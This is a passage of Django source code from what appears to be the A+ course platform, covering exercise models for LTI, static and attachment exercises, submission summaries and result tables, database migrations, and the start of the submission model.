url_name, submission_url):\n        \"\"\"\n        Generates complete URL with added parameters to the exercise service.\n        \"\"\"\n        uid_str = '-'.join(sorted(str(profile.user.id) for profile in students)) if students else ''\n        auri = (\n            settings.OVERRIDE_SUBMISSION_HOST + submission_url\n            if settings.OVERRIDE_SUBMISSION_HOST\n            else request.build_absolute_uri(submission_url)\n        )\n        return update_url_params(pick_localized(self.service_url, language), {\n            \"max_points\": self.max_points,\n            \"max_submissions\": self.max_submissions,\n            \"submission_url\": auri,\n            \"post_url\": request.build_absolute_uri(str(self.get_url(url_name))),\n            \"uid\": uid_str,\n            \"ordinal_number\": ordinal_number,\n            \"lang\": language,\n        })\n\n    @property\n    def can_regrade(self):\n        \"\"\"Can this exercise be regraded in the assessment service, i.e.,\n        can previous submissions be uploaded again for grading?\"\"\"\n        return True\n\n    def can_show_model_solutions_to_student(self, student):\n        result = super().can_show_model_solutions_to_student(student)\n        if not result:\n            return False\n\n        submission = self.get_submissions_for_student(student.userprofile).first()\n        if submission:\n            # When the exercise uses group submissions, a deadline deviation\n            # may be granted to only one group member, but it affects the whole\n            # group. Therefore, we must check deadline deviations for all group\n            # members. All submissions to one exercise are made with the same group.\n            students = list(submission.submitters.all())\n        else:\n            students = [student.userprofile]\n\n        # Student may not view model solutions if he can still submit and gain\n        # points due to a personal deadline extension.\n        deviation = self.one_has_deadline_deviation(students)\n        if deviation:\n            return timezone.now() > deviation.get_new_deadline()\n        return True\n\n\nclass LTIExercise(BaseExercise):\n    \"\"\"\n    Exercise launched by LTI or optionally amending A+ protocol with LTI data.\n    \"\"\"\n    lti_service = models.ForeignKey(LTIService, on_delete=models.CASCADE)\n    context_id = models.CharField(max_length=128, blank=True,\n        help_text=_('Default: [hostname]/[course:url]/[instance:url]/'))\n    resource_link_id = models.CharField(max_length=128, blank=True,\n        help_text=_('Default: [aplusexercise:id]'))\n    resource_link_title = models.CharField(max_length=128, blank=True,\n        help_text=_('Default: the menu label of the LTI service'))\n    aplus_get_and_post = models.BooleanField(default=False,\n        help_text=_('Perform GET and POST from A+ to custom service URL with LTI data appended.'))\n    open_in_iframe = models.BooleanField(default=False,\n        help_text=_('Open the exercise in an iframe inside the A+ page instead of a new window.'))\n\n    objects = models.Manager()\n\n    def clean(self):\n        \"\"\"\n        Validates the model before saving (standard method used in Django admin).\n        \"\"\"\n        super().clean()\n        # If service_url is defined and is an absolute URL, it must be in the\n        # same domain as the LTI service.\n        # Relative URLs are joined to the URL of the LTI service.\n        if self.service_url:\n            uri = urlsplit(self.service_url)\n            if uri.netloc:\n                if uri.netloc != urlsplit(self.lti_service.url).netloc:\n                    raise ValidationError({\n                        'service_url': _(\"Domain of Service URL must match the domain of LTI Service or it should only be the path.\"),\n                    })\n                # Save only the URL path in the database without the domain\n                self.service_url = uri._replace(scheme='', netloc='').geturl()\n\n    def load(self, request, students, url_name=\"exercise\"):\n        if not self.lti_service.enabled:\n            messages.error(request, _(\"The exercise can not be loaded because the external LTI service has been disabled.\"))\n            raise PermissionDenied(\"The LTI service is disabled.\")\n\n        if self.aplus_get_and_post:\n            return super().load(request, students, url_name=url_name)\n\n        if not students:\n            return ExercisePage(self)\n\n        url = self.lti_service.get_final_url(self.service_url)\n        lti = self._get_lti(students[0].user, students, request)\n\n        # Render launch button.\n        page = ExercisePage(self)\n        page.content = self.content\n        template = loader.get_template('external_services/_launch.html')\n        page.content += template.render(Context({\n            'service': self.lti_service,\n            'service_label': self.lti_service.menu_label,\n            'url': url,\n            'parameters': lti.sign_post_parameters(url),\n            'parameters_hash': lti.get_checksum_of_parameters(only_user_and_course_level_params=True),\n            'exercise': self,\n            'is_course_staff': self.course_instance.is_course_staff(request.user),\n            'site': '/'.join(url.split('/')[:3]),\n        }))\n        return page\n\n    def _get_lti(self, user, students, request, add=None):\n        try:\n            return CustomStudentInfoLTIRequest(\n                self.lti_service,\n                user,\n                students,\n                self.course_instance,\n                request,\n                self.resource_link_title or self.lti_service.menu_label or self.name,\n                self.context_id or None,\n                self.resource_link_id or \"aplusexercise{:d}\".format(self.id or 0),\n                add,\n                exercise=self,\n            )\n        except PermissionDenied:\n            raise\n\n    def get_load_url(self, language, request, students, url_name=\"exercise\"):\n        url = super().get_load_url(language, request, students, url_name)\n        if self.lti_service and students:\n            lti = self._get_lti(students[0].user, [], request)\n            return lti.sign_get_query(url)\n        return url\n\n    def modify_post_parameters(self, data, files, user, students, request, url):\n        literals = {key: str(val[0]) for key,val in data.items()}\n        lti = self._get_lti(user, students, request, add=literals)\n        data.update(lti.sign_post_parameters(url))\n\n    def _build_service_url(self, *args, **kwargs):\n        url = super()._build_service_url(*args, **kwargs)\n        if url and url.startswith('//') or '://' in url:\n            return url\n        return self.lti_service.get_final_url(url)\n\n    @property\n    def can_regrade(self):\n        # the LTI protocol does not support regrading in the A+ way\n        # (A+ would upload a submission to the service and expect it to be graded)\n        return False\n\n\nclass StaticExercise(BaseExercise):\n    \"\"\"\n    Static exercises are used for storing submissions on the server, but not automatically\n    assessing them. Static exercises may be retrieved by other services through the API.\n\n    Chapters should be used for non submittable content.\n\n    Should be deprecated as a contradiction to A+ ideology.\n    \"\"\"\n    exercise_page_content = models.TextField()\n    submission_page_content = models.TextField()\n\n    objects = models.Manager()\n\n    def load(self, request, students, url_name=\"exercise\"):\n        page = ExercisePage(self)\n        page.content = self.exercise_page_content\n        return page\n\n    def grade(self, request, submission, no_penalties=False, url_name=\"exercise\"):\n        page = ExercisePage(self)\n        page.content = self.submission_page_content\n        page.is_accepted = True\n        return page\n\n    def _is_empty(self):\n        return not bool(self.exercise_page_content)\n\n    @property\n    def can_regrade(self):\n        return False\n\n\ndef build_upload_dir(instance, filename):\n    \"\"\"\n    Returns the path to a directory where the attachment file should be saved.\n    This is called every time a new ExerciseWithAttachment model is created.\n\n    @param instance: the ExerciseWithAttachment object\n    @param filename: the actual name of the submitted file\n    @return: a path where the file should be stored, relative to MEDIA_ROOT directory\n    \"\"\"\n    return \"course_instance_{:d}/exercise_attachment_{:d}/{}\".format(\n        instance.course_instance.id,\n        instance.id,\n        safe_file_name(filename)\n    )\n\n\nclass ExerciseWithAttachment(BaseExercise):\n    \"\"\"\n    ExerciseWithAttachment is an exercise type where the exercise instructions\n    are stored locally and the exercise will be graded by sending an additional\n    attachment to the grader together with other POST data. The exercise page\n    will contain a submission form for the files the user should submit if the\n    files to be submitted are defined. Otherwise the instructions must contain\n    the submission form.\n\n    Could be deprecated as a contradiction to A+ purist ideology.\n    \"\"\"\n    files_to_submit = models.CharField(max_length=200, blank=True,\n        help_text=_(\"File names that user should submit, use pipe character to separate files\"))\n    attachment = models.FileField(upload_to=build_upload_dir)\n\n    objects = models.Manager()\n\n    class Meta:\n        verbose_name_plural = \"exercises with attachment\"\n\n    def get_files_to_submit(self):\n        \"\"\"\n        Returns a list of the file names that user should submit with this exercise.\n        \"\"\"\n        if len(self.files_to_submit.strip()) == 0:\n            return []\n        else:\n            files = self.files_to_submit.split(\"|\")\n            return [filename.strip() for filename in files]\n\n    def load(self, request, students, url_name=\"exercise\"):\n        page = ExercisePage(self)\n        page.content = self.content\n\n        # Adds the submission form to the content if there are files to be\n        # submitted. A template is used to avoid hard-coded HTML here.\n        if self.get_files_to_submit():\n            template = loader.get_template('exercise/model/_file_submit_form.html')\n            context = Context({'files' : self.get_files_to_submit()})\n            page.content += template.render(context)\n\n        return page\n\n    def modify_post_parameters(self, data, files, user, students, request, url):\n        \"\"\"\n        Adds the attachment file to post parameters.\n        \"\"\"\n        import os\n        files['content_0'] = (\n            os.path.basename(self.attachment.path),\n            open(self.attachment.path, \"rb\")\n        )\n\n\ndef _delete_file(sender, instance, **kwargs):\n    \"\"\"\n    Deletes exercise attachment file after the exercise in database is removed.\n    \"\"\"\n    default_storage.delete(instance.attachment.path)\n\n\ndef _clear_cache(sender, instance, **kwargs):\n    \"\"\"\n    Clears parent's cached html if any.\n    \"\"\"\n    if instance.parent:\n        ExerciseCache.invalidate(instance.parent)\n\n\npost_delete.connect(_delete_file, ExerciseWithAttachment)\npost_save.connect(_clear_cache, LearningObject)\n/n/n/nexercise/exercise_summary.py/n/nimport itertools\n\nfrom django.core.exceptions import ObjectDoesNotExist\nfrom django.db.models import Max\n\nfrom course.models import StudentGroup\nfrom .cache.content import CachedContent\nfrom .models import BaseExercise, Submission\n\n\nclass UserExerciseSummary(object):\n    \"\"\"\n    UserExerciseSummary summarises the submissions of a certain user and\n    exercise. It calculates some characterizing figures such as the number of\n    submissions and reference to the best submission. See the public methods\n    for more.\n    \"\"\"\n    def __init__(self, exercise, user=None):\n        self.exercise = exercise\n        self.max_points = getattr(exercise, 'max_points', 0)\n        self.difficulty = getattr(exercise, 'difficulty', '')\n        self.points_to_pass = getattr(exercise, 'points_to_pass', 0)\n        self.user = user\n        self.submissions = []\n        self.submission_count = 0\n        self.best_submission = None\n        self.graded = False\n        self.unofficial = False\n\n        if self.user and self.user.is_authenticated:\n            self.submissions = list(exercise.get_submissions_for_student(\n                user.userprofile))\n            for s in self.submissions:\n                if not s.status in (\n                    Submission.STATUS.ERROR,\n                    Submission.STATUS.REJECTED,\n                ):\n                    self.submission_count += 1\n                    if (\n                        s.status == Submission.STATUS.READY and (\n                            self.best_submission is None\n                            or self.unofficial\n                            or s.grade > self.best_submission.grade\n                        )\n                    ):\n                        self.best_submission = s\n                        self.unofficial = False\n                        self.graded = True\n                    elif (\n                        s.status == Submission.STATUS.UNOFFICIAL and (\n                            not self.graded\n                            or (\n                                self.unofficial\n                                and s.grade > self.best_submission.grade\n                            )\n                        )\n                    ):\n                        self.best_submission = s\n                        self.unofficial = True\n\n    def get_submission_count(self):\n        return self.submission_count\n\n    def get_submissions(self):\n        return self.submissions\n\n    def get_best_submission(self):\n        return self.best_submission\n\n    def get_points(self):\n        return self.best_submission.grade if self.best_submission and not self.unofficial else 0\n\n    def get_penalty(self):\n        return self.best_submission.late_penalty_applied if self.best_submission else None\n\n    def is_missing_points(self):\n        return self.get_points() < self.points_to_pass\n\n    def is_full_points(self):\n        return self.get_points() >= self.max_points\n\n    def is_passed(self):\n        return not self.is_missing_points()\n\n    def is_submitted(self):\n        return self.submission_count > 0\n\n    def is_graded(self):\n        return self.graded\n\n    def is_unofficial(self):\n        return self.unofficial\n\n    def get_group(self):\n        if self.submission_count > 0:\n            s = self.submissions[0]\n            if s.submitters.count() > 0:\n                return StudentGroup.get_exact(\n                    self.exercise.course_instance,\n                    s.submitters.all()\n                )\n        return None\n\n    def get_group_id(self):\n        group = self.get_group()\n        return group.id if group else 0\n\n\nclass ResultTable:\n    \"\"\"\n    WARNING: Constructing this class is a heavy database operation.\n\n    Models the table displaying the grades for each student on each exercise.\n    Result tables are generated dynamically when needed and not stored\n    in a database.\n    \"\"\"\n\n    def __init__(self, course_instance):\n        \"\"\"\n        Instantiates a new ResultTable for the given course instance.\n        After initialization the table is filled with grades from the database.\n        \"\"\"\n        self.course_instance = course_instance\n\n        # Exercises on the course.\n        self.exercises = list(self.__get_exercises())\n        self.categories = course_instance.categories.all()\n\n        # Students on the course.\n        self.students = list(course_instance.get_student_profiles())\n\n        # Empty results table.\n        self.results = {\n            student.id: {\n                exercise.id: None for exercise in self.exercises\n            } for student in self.students\n        }\n        self.results_by_category = {\n            student.id: {\n                category.id: 0 for category in self.categories\n            } for student in self.students\n        }\n\n        # Fill the results with the data from the database.\n        self.__collect_student_grades()\n\n\n    def __get_exercises(self):\n        content = CachedContent(self.course_instance)\n\n        def get_descendant_ids(node):\n            children = node['children']\n            if children:\n                return itertools.chain.from_iterable(\n                    [get_descendant_ids(child) for child in children])\n            return (node['id'],)\n\n        root_node = { 'children': content.modules() }\n        ids = get_descendant_ids(root_node)\n\n        # Loop until end of ids raises StopIteration\n        while True:\n            id = next(ids)\n            try:\n                yield BaseExercise.objects.get(learningobject_ptr_id=id)\n            except ObjectDoesNotExist:\n                continue\n\n\n    def __collect_student_grades(self):\n        \"\"\"\n        Helper for the __init__.\n        This method puts the data from the database in to the results table.\n        \"\"\"\n        submissions = list(Submission.objects \\\n            .filter(\n                exercise__course_module__course_instance=self.course_instance,\n                status=Submission.STATUS.READY\n            ).values(\"submitters\", \"exercise\", \"exercise__category\") \\\n            .annotate(best=Max(\"grade\")) \\\n            .order_by()) # Remove default ordering.\n        for submission in submissions:\n            student_id = submission[\"submitters\"]\n            if student_id in self.results:\n                self.results[student_id][submission[\"exercise\"]] = submission[\"best\"]\n                self.results_by_category[student_id][submission[\"exercise__category\"]] += submission[\"best\"]\n\n\n    def results_for_template(self):\n        \"\"\"\n        Converts the results data into a form that is convenient for to use in a\n        template. The columns of the table ordered according to the order of the\n        exercises in self.exercises.\n        \"\"\"\n        for_template = []\n        for student in self.students:\n            grades = [ self.results[student.id][exercise.id] \\\n                for exercise in self.exercises ]\n            total = sum(g for g in grades if g is not None)\n            for_template.append((student, grades, total))\n        return for_template\n\n\n    def max_sum(self):\n        return sum(e.max_points for e in self.exercises)\n/n/n/nexercise/migrations/0001_initial.py/n/n# -*- coding: utf-8 -*-\n\n\nfrom django.db import models, migrations\nfrom django.utils import timezone\nimport datetime\nimport exercise.submission_models\nimport lib.helpers\nimport exercise.exercise_models\nimport lib.fields\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('inheritance', '0001_initial'),\n        ('userprofile', '0001_initial'),\n        ('course', '0001_initial'),\n    ]\n\n    operations = [\n        migrations.CreateModel(\n            name='CourseModule',\n            fields=[\n                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),\n                ('name', models.CharField(max_length=255)),\n                ('points_to_pass', models.PositiveIntegerField(default=0)),\n                ('introduction', models.TextField(blank=True)),\n                ('opening_time', models.DateTimeField(default=timezone.now)),\n                ('closing_time', models.DateTimeField(default=timezone.now)),\n                ('late_submissions_allowed', models.BooleanField(default=False)),\n                ('late_submission_deadline', models.DateTimeField(default=timezone.now)),\n                ('late_submission_penalty', lib.fields.PercentField(default=0.5, help_text='Multiplier of points to reduce, as decimal. 0.1 = 10%')),\n                ('course_instance', models.ForeignKey(related_name='course_modules', to='course.CourseInstance', on_delete=models.CASCADE)),\n            ],\n            options={\n                'ordering': ['closing_time', 'id'],\n            },\n            bases=(models.Model,),\n        ),\n        migrations.CreateModel(\n            name='DeadlineRuleDeviation',\n            fields=[\n                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),\n                ('extra_minutes', models.IntegerField()),\n            ],\n            options={\n                'abstract': False,\n            },\n            bases=(models.Model,),\n        ),\n        migrations.CreateModel(\n            name='LearningObject',\n            fields=[\n                ('modelwithinheritance_ptr', models.OneToOneField(\n                    to='inheritance.ModelWithInheritance', on_delete=models.CASCADE,\n                    parent_link=True, auto_created=True, primary_key=True, serialize=False)),\n                ('order', models.IntegerField(default=0)),\n                ('name', models.CharField(max_length=255)),\n                ('description', models.TextField(blank=True)),\n                ('instructions', models.TextField(blank=True)),\n                ('service_url', models.URLField(blank=True)),\n            ],\n            options={\n            },\n            bases=('inheritance.modelwithinheritance',),\n        ),\n        migrations.CreateModel(\n            name='BaseExercise',\n            fields=[\n                ('learningobject_ptr', models.OneToOneField(\n                    to='exercise.LearningObject', on_delete=models.CASCADE,\n                    parent_link=True, auto_created=True, primary_key=True, serialize=False)),\n                ('allow_assistant_grading', models.BooleanField(default=False)),\n                ('min_group_size', models.PositiveIntegerField(default=1)),\n                ('max_group_size', models.PositiveIntegerField(default=1)),\n                ('max_submissions', models.PositiveIntegerField(default=10)),\n                ('max_points', models.PositiveIntegerField(default=100)),\n                ('points_to_pass', models.PositiveIntegerField(default=40)),\n            ],\n            options={\n                'ordering': ['course_module__closing_time', 'course_module', 'order', 'id'],\n            },\n            bases=('exercise.learningobject',),\n        ),\n        migrations.CreateModel(\n            name='ExerciseWithAttachment',\n            fields=[\n                ('baseexercise_ptr', models.OneToOneField(\n                    to='exercise.BaseExercise', on_delete=models.CASCADE,\n                    parent_link=True, auto_created=True, primary_key=True, serialize=False)),\n                ('files_to_submit', models.CharField(help_text='File names that user should submit, use pipe character to separate files', max_length=200, blank=True)),\n                ('attachment', models.FileField(upload_to=exercise.exercise_models.build_upload_dir)),\n            ],\n            options={\n                'verbose_name_plural': 'exercises with attachment',\n            },\n            bases=('exercise.baseexercise',),\n        ),\n        migrations.CreateModel(\n            name='AsynchronousExercise',\n            fields=[\n                ('baseexercise_ptr', models.OneToOneField(\n                    to='exercise.BaseExercise', on_delete=models.CASCADE,\n                    parent_link=True, auto_created=True, primary_key=True, serialize=False)),\n            ],\n            options={\n            },\n            bases=('exercise.baseexercise',),\n        ),\n        migrations.CreateModel(\n            name='LearningObjectCategory',\n            fields=[\n                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),\n                ('name', models.CharField(max_length=35)),\n                ('description', models.TextField(blank=True)),\n                ('points_to_pass', models.PositiveIntegerField(default=0)),\n                ('course_instance', models.ForeignKey(related_name='categories', to='course.CourseInstance', on_delete=models.CASCADE)),\n                ('hidden_to', models.ManyToManyField(related_name='hidden_categories', null=True, to='userprofile.UserProfile', blank=True)),\n            ],\n            options={\n            },\n            bases=(models.Model,),\n        ),\n        migrations.CreateModel(\n            name='MaxSubmissionsRuleDeviation',\n            fields=[\n                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),\n                ('extra_submissions', models.IntegerField()),\n            ],\n            options={\n                'abstract': False,\n            },\n            bases=(models.Model,),\n        ),\n        migrations.CreateModel(\n            name='StaticExercise',\n            fields=[\n                ('baseexercise_ptr', models.OneToOneField(\n                    to='exercise.BaseExercise', on_delete=models.CASCADE,\n                    parent_link=True, auto_created=True, primary_key=True, serialize=False)),\n                ('exercise_page_content', models.TextField()),\n                ('submission_page_content', models.TextField()),\n            ],\n            options={\n            },\n            bases=('exercise.baseexercise',),\n        ),\n        migrations.CreateModel(\n            name='Submission',\n            fields=[\n                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),\n                ('submission_time', models.DateTimeField(auto_now_add=True)),\n                ('hash', models.CharField(default=lib.helpers.get_random_string, max_length=32)),\n                ('feedback', models.TextField(blank=True)),\n                ('assistant_feedback', models.TextField(blank=True)),\n                ('status', models.CharField(default=b'initialized', max_length=32, choices=[(b'initialized', 'Initialized'), (b'waiting', 'Waiting'), (b'ready', 'Ready'), (b'error', 'Error')])),\n                ('grade', models.IntegerField(default=0)),\n                ('grading_time', models.DateTimeField(null=True, blank=True)),\n                ('service_points', models.IntegerField(default=0)),\n                ('service_max_points', models.IntegerField(default=0)),\n                ('submission_data', lib.fields.JSONField(blank=True)),\n                ('grading_data', lib.fields.JSONField(blank=True)),\n            ],\n            options={\n                'ordering': ['-submission_time'],\n            },\n            bases=(models.Model,),\n        ),\n        migrations.CreateModel(\n            name='SubmittedFile',\n            fields=[\n                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),\n                ('param_name', models.CharField(max_length=128)),\n                ('file_object', models.FileField(max_length=255, upload_to=exercise.submission_models.build_upload_dir)),\n                ('submission', models.ForeignKey(related_name='files', to='exercise.Submission', on_delete=models.CASCADE)),\n            ],\n            options={\n            },\n            bases=(models.Model,),\n        ),\n        migrations.CreateModel(\n            name='SynchronousExercise',\n            fields=[\n                ('baseexercise_ptr', models.OneToOneField(\n                    to='exercise.BaseExercise', on_delete=models.CASCADE,\n                    parent_link=True, auto_created=True, primary_key=True, serialize=False)),\n            ],\n            options={\n            },\n            bases=('exercise.baseexercise',),\n        ),\n        migrations.AddField(\n            model_name='submission',\n            name='exercise',\n            field=models.ForeignKey(related_name='submissions', to='exercise.BaseExercise', on_delete=models.CASCADE),\n            preserve_default=True,\n        ),\n        migrations.AddField(\n            model_name='submission',\n            name='grader',\n            field=models.ForeignKey(related_name='graded_submissions', blank=True, to='userprofile.UserProfile', null=True, on_delete=models.CASCADE),\n            preserve_default=True,\n        ),\n        migrations.AddField(\n            model_name='submission',\n            name='submitters',\n            field=models.ManyToManyField(related_name='submissions', to='userprofile.UserProfile'),\n            preserve_default=True,\n        ),\n        migrations.AddField(\n            model_name='maxsubmissionsruledeviation',\n            name='exercise',\n            field=models.ForeignKey(related_name='maxsubmissionsruledeviations', to='exercise.BaseExercise', on_delete=models.CASCADE),\n            preserve_default=True,\n        ),\n        migrations.AddField(\n            model_name='maxsubmissionsruledeviation',\n            name='submitter',\n            field=models.ForeignKey(to='userprofile.UserProfile', on_delete=models.CASCADE),\n            preserve_default=True,\n        ),\n        migrations.AlterUniqueTogether(\n            name='maxsubmissionsruledeviation',\n            unique_together=set([('exercise', 'submitter')]),\n        ),\n        migrations.AlterUniqueTogether(\n            name='learningobjectcategory',\n            unique_together=set([('name', 'course_instance')]),\n        ),\n        migrations.AddField(\n            model_name='learningobject',\n            name='category',\n            field=models.ForeignKey(related_name='learning_objects', to='exercise.LearningObjectCategory', on_delete=models.CASCADE),\n            preserve_default=True,\n        ),\n        migrations.AddField(\n            model_name='learningobject',\n            name='course_module',\n            field=models.ForeignKey(related_name='learning_objects', to='exercise.CourseModule', on_delete=models.CASCADE),\n            preserve_default=True,\n        ),\n        migrations.AddField(\n            model_name='deadlineruledeviation',\n            name='exercise',\n            field=models.ForeignKey(related_name='deadlineruledeviations', to='exercise.BaseExercise', on_delete=models.CASCADE),\n            preserve_default=True,\n        ),\n        migrations.AddField(\n            model_name='deadlineruledeviation',\n            name='submitter',\n            field=models.ForeignKey(to='userprofile.UserProfile', on_delete=models.CASCADE),\n            preserve_default=True,\n        ),\n        migrations.AlterUniqueTogether(\n            name='deadlineruledeviation',\n            unique_together=set([('exercise', 'submitter')]),\n        ),\n    ]\n/n/n/nexercise/migrations/0005_auto_20150625_1821.py/n/n# -*- coding: utf-8 -*-\nfrom __future__ import unicode_literals\n\nfrom django.db import models, migrations\nimport django.utils.timezone\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('exercise', '0004_auto_20150617_1033'),\n    ]\n\n    operations = [\n        migrations.AlterField(\n            model_name='coursemodule',\n            name='closing_time',\n            field=models.DateTimeField(default=django.utils.timezone.now),\n            preserve_default=True,\n        ),\n        migrations.AlterField(\n            model_name='coursemodule',\n            name='late_submission_deadline',\n            field=models.DateTimeField(default=django.utils.timezone.now),\n            preserve_default=True,\n        ),\n        migrations.AlterField(\n            model_name='coursemodule',\n            name='opening_time',\n            field=models.DateTimeField(default=django.utils.timezone.now),\n            preserve_default=True,\n        ),\n        migrations.AlterField(\n            model_name='deadlineruledeviation',\n            name='exercise',\n            field=models.ForeignKey(to='exercise.BaseExercise', on_delete=models.CASCADE),\n            preserve_default=True,\n        ),\n        migrations.AlterField(\n            model_name='maxsubmissionsruledeviation',\n            name='exercise',\n            field=models.ForeignKey(to='exercise.BaseExercise', on_delete=models.CASCADE),\n            preserve_default=True,\n        ),\n    ]\n/n/n/nexercise/migrations/0007_auto_20150625_1835.py/n/n# -*- coding: utf-8 -*-\nfrom __future__ import unicode_literals\n\nfrom django.db import models, migrations\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('exercise', '0006_auto_20150625_1823'),\n        ('course', '0005_auto_20150625_1835'),\n        ('deviations', '0001_initial')\n    ]\n\n    operations = [\n        migrations.AlterField(\n            model_name='learningobject',\n            name='category',\n            field=models.ForeignKey(related_name='learning_objects', to='course.LearningObjectCategory', on_delete=models.CASCADE),\n            preserve_default=True,\n        ),\n        migrations.AlterField(\n            model_name='learningobject',\n            name='course_module',\n            field=models.ForeignKey(related_name='learning_objects', to='course.CourseModule', on_delete=models.CASCADE),\n            preserve_default=True,\n        ),\n    ]\n/n/n/nexercise/migrations/0011_auto_20151218_0857.py/n/n# -*- coding: utf-8 -*-\nfrom __future__ import unicode_literals\n\nfrom django.db import models, migrations\nimport django.core.validators\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('exercise', '0010_auto_20151214_1714'),\n    ]\n\n    operations = [\n        migrations.CreateModel(\n            name='CourseChapter',\n            fields=[\n                ('learningobject_ptr', models.OneToOneField(\n                    to='exercise.LearningObject', on_delete=models.CASCADE,\n                    parent_link=True, primary_key=True, serialize=False, auto_created=True)),\n                ('generate_table_of_contents', models.BooleanField(default=False)),\n            ],\n            options={\n            },\n            bases=('exercise.learningobject',),\n        ),\n        migrations.AddField(\n            model_name='learningobject',\n            name='content_head',\n            field=models.TextField(blank=True),\n            preserve_default=True,\n        ),\n        migrations.AddField(\n            model_name='learningobject',\n            name='parent',\n            field=models.ForeignKey(related_name='children', null=True, to='exercise.LearningObject', blank=True, on_delete=models.CASCADE),\n            preserve_default=True,\n        ),\n        migrations.AddField(\n            model_name='learningobject',\n            name='status',\n            field=models.CharField(choices=[('ready', 'Ready'), ('hidden', 'Hidden'), ('maintenance', 'Maintenance')], max_length=32, default='ready'),\n            preserve_default=True,\n        ),\n        migrations.AddField(\n            model_name='learningobject',\n            name='url',\n            field=models.CharField(max_length=255, help_text='Input an URL identifier for this object.', validators=[django.core.validators.RegexValidator(regex='^[\\\\w\\\\-\\\\.]*$')],\n            blank=True, null=True, default=None),\n            preserve_default=True,\n        ),\n        migrations.AddField(\n            model_name='learningobject',\n            name='use_wide_column',\n            field=models.BooleanField(help_text='Remove the third info column for more space.', default=False),\n            preserve_default=True,\n        ),\n        migrations.AlterField(\n            model_name='learningobject',\n            name='description',\n            field=models.TextField(help_text='Internal description is not presented on site.', blank=True),\n            preserve_default=True,\n        ),\n    ]\n/n/n/nexercise/migrations/0014_ltiexercise.py/n/n# -*- coding: utf-8 -*-\nfrom __future__ import unicode_literals\n\nfrom django.db import models, migrations\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('external_services', '0004_auto_20150828_1210'),\n        ('exercise', '0013_auto_20151222_1320'),\n    ]\n\n    operations = [\n        migrations.CreateModel(\n            name='LTIExercise',\n            fields=[\n                ('baseexercise_ptr', models.OneToOneField(\n                    to='exercise.BaseExercise', on_delete=models.CASCADE,\n                    auto_created=True, primary_key=True, serialize=False, parent_link=True)),\n                ('lti_service', models.ForeignKey(to='external_services.LTIService', on_delete=models.CASCADE)),\n            ],\n            options={\n            },\n            bases=('exercise.baseexercise',),\n        ),\n    ]\n/n/n/nexercise/migrations/0015_auto_20160124_2139.py/n/n# -*- coding: utf-8 -*-\nfrom __future__ import unicode_literals\n\nfrom django.db import models, migrations\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('userprofile', '0002_auto_20150427_1717'),\n        ('exercise', '0014_ltiexercise'),\n    ]\n\n    operations = [\n        migrations.CreateModel(\n            name='LearningObjectDisplay',\n            fields=[\n                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),\n                ('timestamp', models.DateTimeField(auto_now_add=True)),\n                ('learning_object', models.ForeignKey(to='exercise.LearningObject', on_delete=models.CASCADE)),\n                ('profile', models.ForeignKey(to='userprofile.UserProfile', on_delete=models.CASCADE)),\n            ],\n            options={\n            },\n            bases=(models.Model,),\n        ),\n        migrations.AlterField(\n            model_name='learningobject',\n            name='status',\n            field=models.CharField(choices=[('ready', 'Ready'), ('unlisted', 'Unlisted in table of contents'), ('enrollment', 'Enrollment questions'), ('hidden', 'Hidden from non course staff'), ('maintenance', 'Maintenance')], max_length=32, default='ready'),\n            preserve_default=True,\n        ),\n    ]\n/n/n/nexercise/migrations/0035_auto_20190426_1731.py/n/n# -*- coding: utf-8 -*-\n# Generated by Django 1.10.8 on 2019-04-26 14:31\nfrom __future__ import unicode_literals\n\nfrom django.db import migrations, models\nimport django.db.models.deletion\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('exercise', '0034_auto_20190416_1133'),\n    ]\n\n    operations = [\n        migrations.AlterField(\n            model_name='submission',\n            name='grader',\n            field=models.ForeignKey(blank=True, null=True, on_delete=django.db.models.deletion.SET_NULL, related_name='graded_submissions', to='userprofile.UserProfile'),\n        ),\n    ]\n/n/n/nexercise/submission_models.py/n/nimport logging\nimport os\n\nfrom django.conf import settings\nfrom django.core.files.storage import default_storage\nfrom django.db import models, DatabaseError\nfrom django.db.models.signals import post_delete\nfrom django.utils import timezone\nfrom django.utils.translation import ugettext_lazy as _\nfrom mimetypes import guess_type\n\nfrom lib.fields import JSONField, PercentField\nfrom lib.helpers import get_random_string, query_dict_to_list_of_tuples, \\\n    safe_file_name, Enum\nfrom lib.models import UrlMixin\nfrom userprofile.models import UserProfile\nfrom . import exercise_models\n\n\nlogger = logging.getLogger('aplus.exercise')\n\n\nclass SubmissionManager(models.Manager):\n\n    def get_queryset(self):\n        return super().get_queryset()\\\n            .prefetch_related('submitters')\n\n    def create_from_post(self, exercise, submitters, request):\n        new_submission = Submission.objects.create(\n            exercise=exercise,\n            submission_data=query_dict_to_list_of_tuples(request.POST)\n        )\n        new_submission.submitters = submitters\n        try:\n            new_submission.add_files(request.FILES)\n        except DatabaseError:\n            logger.exception(\"Failed to save submitted files: %s %s\",\n                request.user.username, exercise);\n            new_submission.delete()\n            return None\n        return new_submission\n\n    def exclude_errors(self):\n        return self.exclude(status__in=(\n            Submission.STATUS.ERROR,\n            Submission.STATUS.REJECTED,\n        ))\n\n\nclass Submission(UrlMixin, models.Model):\n    \"\"\"\n    A submission to some course exercise from one or more submitters.\n    \"\"\"\n    STATUS = Enum([\n        ('INITIALIZED', 'initialized', _(\"Initialized\")),\n        ('WAITING', 'waiting', _(\"In grading\")),\n        ('READY', 'ready', _(\"Ready\")), # graded normally\n        ('ERROR', 'error', _(\"Error\")),\n        ('REJECTED', 'rejected', _(\"Rejected\")), # missing fields etc\n        ('UNOFFICIAL', 'unofficial', _(\"No effect on grading\")),\n        # unofficial: graded after the deadline or after exceeding the submission limit\n    ])\n    